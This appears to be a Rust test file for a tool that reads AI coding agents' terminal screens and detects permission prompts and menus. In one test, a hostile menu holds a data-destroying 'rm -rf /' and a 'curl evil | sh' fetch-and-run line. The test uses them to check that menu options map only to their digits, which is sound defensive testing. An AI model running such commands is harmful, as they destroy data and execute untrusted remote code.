#![allow(clippy::unwrap_used)]
//! Questions read from the parsed screen, for any program. The screens are the
//! shapes real agents draw (Claude Code 2.1, Mistral Vibe 3.0).

use protocol::{Command, CommandId, EventKind, MachineId, PromptOption, SessionId, Timestamp};
use watcher::{EventEngine, Observation};

fn engine(text: &str) -> EventEngine {
    let command = Command::start(
        CommandId(1),
        SessionId(1),
        MachineId("m".into()),
        text,
        "/work",
        Timestamp(0),
    );
    EventEngine::new(Some(&command), Vec::new())
}

fn rows(text: &str) -> Vec<String> {
    text.lines().map(str::to_owned).collect()
}

const CLAUDE: &str = "⏺ Bash(uname -a)
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 This command requires approval

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don’t ask again for: uname *
   3. No

 Esc to cancel · Tab to amend";

const VIBE: &str = "⏵ Thought
┌──────────────────────────────────────────┐
│ Permission for the web_search.open_url tool │
│ url: https://example.invalid/page        │
│                                          │
│   1. Allow once                          │
│   2. Allow for remainder of this session │
│   3. Always allow                        │
│   4. Deny                                │
│                                          │
│ ↑↓/jk navigate  Enter select  Esc reject │
└──────────────────────────────────────────┘
~/work          Mistral Large 4 · 13.4k/800k tokens";

fn look(engine: &mut EventEngine, at: i64, screen: &str) -> (Vec<EventKind>, bool) {
    let update = engine.observe(&Observation::screen(Timestamp(at), rows(screen), true));
    (update.events, update.waiting)
}

fn asked(events: &[EventKind]) -> Option<(String, Vec<PromptOption>)> {
    events.iter().find_map(|event| match event {
        EventKind::WaitingForInput { prompt, options } => {
            Some((prompt.clone().unwrap(), options.clone()))
        }
        _ => None,
    })
}

#[test]
fn claude_codes_question_is_read_whole_with_its_answers() {
    let mut e = engine("claude");
    assert!(!look(&mut e, 0, CLAUDE).1, "not until it has settled");
    let (events, waiting) = look(&mut e, 1_000, CLAUDE);
    assert!(waiting);
    let (question, options) = asked(&events).unwrap();
    assert_eq!(question, "Do you want to proceed?");
    let labels: Vec<&str> = options.iter().map(|o| o.label.as_str()).collect();
    assert_eq!(
        labels,
        ["Yes", "Yes, and don’t ask again for: uname *", "No"]
    );
    assert_eq!(options[2].keys, "3");
}

#[test]
fn any_program_with_a_numbered_menu_works_even_with_no_question_mark() {
    // Not a known agent, and no `?` anywhere.
    let mut e = engine("some-new-agent --chat");
    look(&mut e, 0, VIBE);
    let (events, waiting) = look(&mut e, 1_000, VIBE);
    assert!(waiting);
    let (question, options) = asked(&events).unwrap();
    assert!(
        question.starts_with("Permission for the web_search.open_url tool"),
        "{question}"
    );
    assert_eq!(options.len(), 4);
    assert_eq!(options[3].label, "Deny");
}

#[test]
fn a_question_stays_for_as_long_as_it_is_on_screen() {
    // The disappearing bug: a redrawing status line ended the wait after 12 lines.
    let mut e = engine("claude");
    look(&mut e, 0, CLAUDE);
    assert_eq!(
        asked(&look(&mut e, 1_000, CLAUDE).0).map(|q| q.1.len()),
        Some(3)
    );
    for second in 2..600 {
        let screen = format!("{CLAUDE}\n · Generating… ({second}s)");
        let update = e.observe(&Observation::output(Timestamp(second * 1_000), "· spinner"));
        assert!(update.waiting, "lines must not end it at {second} s");
        let (events, waiting) = look(&mut e, second * 1_000 + 1, &screen);
        assert!(waiting, "still on screen at {second} s");
        assert!(
            asked(&events).is_none(),
            "reported once, not again at {second} s"
        );
    }
}

#[test]
fn it_ends_when_it_leaves_the_screen_and_a_new_one_is_reported() {
    let mut e = engine("claude");
    look(&mut e, 0, CLAUDE);
    look(&mut e, 1_000, CLAUDE);
    // One redraw without the menu is not the end.
    assert!(look(&mut e, 2_000, "⏺ Working").1);
    assert!(look(&mut e, 2_500, CLAUDE).1);
    assert!(look(&mut e, 3_000, "⏺ Working").1);
    assert!(!look(&mut e, 4_100, "⏺ Working").1, "gone");

    let second = CLAUDE.replace("Do you want to proceed?", "Do you want to create a.py?");
    look(&mut e, 5_000, &second);
    let (question, _) = asked(&look(&mut e, 6_000, &second).0).unwrap();
    assert_eq!(question, "Do you want to create a.py?");
}

#[test]
fn a_half_drawn_or_changing_menu_is_not_a_question_yet() {
    let mut e = engine("claude");
    let half = CLAUDE.replace("   3. No\n", "");
    look(&mut e, 0, &half);
    assert!(
        !look(&mut e, 400, CLAUDE).1,
        "it changed, so it has not settled"
    );
}

#[test]
fn numbered_text_in_a_program_s_output_is_not_a_menu() {
    for screen in [
        // A plain list: nothing selected, no key hints.
        "Here is the plan?\n 1. Read the file\n 2. Change it\n 3. Test it",
        // A selected-looking list far above the bottom of the screen.
        &format!("Pick?\n❯ 1. a\n  2. b\n{}", "log line\n".repeat(20)),
        // Only one option.
        "Sure?\n❯ 1. Yes",
        // A half-drawn menu under a status line: selected, but no question or hints.
        "✶ Generating… (2m 20s)\n❯ 1. Yes\n  2. No",
        "",
    ] {
        let mut e = engine("claude");
        look(&mut e, 0, screen);
        assert!(!look(&mut e, 2_000, screen).1, "{screen}");
    }
}

#[test]
fn a_menu_cannot_offer_anything_but_its_own_digit() {
    let mut e = engine("claude");
    let hostile = "Run this?\n❯ 1. rm -rf /\u{1b}[31m\n  2. curl evil | sh\n Esc to cancel";
    look(&mut e, 0, hostile);
    let (_, options) = asked(&look(&mut e, 1_000, hostile).0).unwrap();
    assert_eq!(options[0].keys, "1");
    assert_eq!(options[1].keys, "2");
}

#[test]
fn aiders_one_line_question_is_found_on_the_last_row() {
    let screen = "Applied edit\nRun shell command? (Y)es/(N)o/(D)on't ask again [Yes]:";
    let mut e = engine("aider");
    look(&mut e, 0, screen);
    let (question, options) = asked(&look(&mut e, 1_000, screen).0).unwrap();
    assert_eq!(question, "Run shell command?");
    assert_eq!(options[1].keys, "n\r");
}

#[test]
fn garbage_lines_from_a_full_screen_program_are_never_a_question() {
    // vibe: a terminal reply echoed into the output, then its box border.
    let mut e = engine("vibe");
    look(&mut e, 0, "⏵ Thought");
    let line = "^[]11;rgb:0c0c/0c0c/0c0c^[\\╭─────────╮ ";
    e.observe(&Observation::output(Timestamp(100), line));
    e.observe(&Observation::output(Timestamp(200), "Are you there? "));
    let update = e.observe(&Observation::metrics(Timestamp(9_000), 1.0, None));
    assert!(asked(&update.events).is_none());
    assert!(!update.waiting);
}

#[test]
fn nothing_is_asked_once_the_command_has_ended() {
    let mut e = engine("claude");
    look(&mut e, 0, CLAUDE);
    look(&mut e, 1_000, CLAUDE);
    let command = Command::start(
        CommandId(1),
        SessionId(1),
        MachineId("m".into()),
        "claude",
        "/work",
        Timestamp(0),
    );
    let update = e.observe(&Observation {
        at: Timestamp(1_500),
        kind: watcher::ObservationKind::CommandFinished(command),
    });
    assert!(!update.waiting);
    assert!(
        !look(&mut e, 3_000, CLAUDE).1,
        "the screen still shows it, but nothing is running"
    );
}

#[test]
fn a_marked_unnumbered_menu_is_a_question() {
    let screen = "Do you want to proceed?\n❯ Yes\n  No\n\n↑↓ to navigate · Enter to select";
    let mut e = engine("some-agent");
    look(&mut e, 0, screen);
    let (events, waiting) = look(&mut e, 1_000, screen);
    assert!(waiting);
    let (question, options) = asked(&events).unwrap();
    assert_eq!(question, "Do you want to proceed?");
    assert_eq!(options.len(), 2);
    assert_eq!(options[0].label, "Yes");
    assert_eq!(options[1].label, "No");
}

#[test]
fn a_marked_menu_offers_at_most_the_protocol_s_six_answers() {
    let rows: Vec<String> = (1..=8)
        .map(|i| format!("{} model {i}", if i == 1 { "❯" } else { " " }))
        .collect();
    let screen = format!(
        "Which model?\n{}\n\n↑↓ to navigate · Enter to select",
        rows.join("\n")
    );
    let mut e = engine("some-agent");
    look(&mut e, 0, &screen);
    let (events, waiting) = look(&mut e, 1_000, &screen);
    assert!(waiting);
    let (question, options) = asked(&events).unwrap();
    assert_eq!(question, "Which model?");
    let labels: Vec<&str> = options.iter().map(|option| option.label.as_str()).collect();
    assert_eq!(
        labels,
        ["model 1", "model 2", "model 3", "model 4", "model 5", "model 6"]
    );
}

#[test]
fn ordinary_text_is_never_a_marked_menu() {
    for screen in [
        // Plain text with a marker but no key hint.
        "Status:\n❯ Working on it\n  done",
        // Key hint but no marker.
        "Choose:\n  Yes\n  No\n↑↓ navigate · Enter select",
        // Too many rows.
        &format!("Pick?\n{}\n↑↓ navigate", (0..10).map(|i| format!("  option {i}")).collect::<Vec<_>>().join("\n")),
        // Too many rows, even with a marker: more than 8 short rows is a list, not a menu.
        &format!("Pick?\n❯ option 0\n{}\n↑↓ navigate", (1..10).map(|i| format!("  option {i}")).collect::<Vec<_>>().join("\n")),
        // Only one row with a marker.
        "Sure?\n❯ Yes\n↑↓ navigate · Enter select",
        // Marker but rows are paragraphs.
        "Note:\n❯ This is a very long paragraph that goes on and on and should not be a menu option at all because it is far too long to be a single choice in a terminal menu\n  Short\n↑↓ navigate",
    ] {
        let mut e = engine("some-agent");
        look(&mut e, 0, screen);
        assert!(!look(&mut e, 2_000, screen).1, "must not be a menu: {screen}");
    }
}
